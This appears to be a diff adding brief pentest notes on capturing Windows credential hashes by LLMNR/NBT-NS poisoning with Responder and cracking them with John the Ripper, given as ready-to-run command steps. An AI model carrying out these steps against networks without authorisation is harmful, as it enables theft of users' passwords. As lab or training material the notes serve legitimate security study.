@@ -1,0 +1,10 @@
+---Responder (For Windows password  cracking)---
+Link-Local Multicast Name Resolution (LLMNR) and Netbios Name Service (NBT-NS) are two components of Microsoft Windows machines. 
+LLMNR was introduced in Windows Vista and is the successor to NBT-NS.
+
+Kali Linux > responder -I eth0 [responder will be listening to events]
+Switch to Windows : Run \\anylocation
+Switch to Kali Linux > observe the logs. Go to /usr/share/responder/logs/<log-file>
+kali linux > john /usr/share/responder/logs/<log-file> [note the cracked password]
+(If john is not installed then :-  sudo snap install john-the-ripper )
+----END----
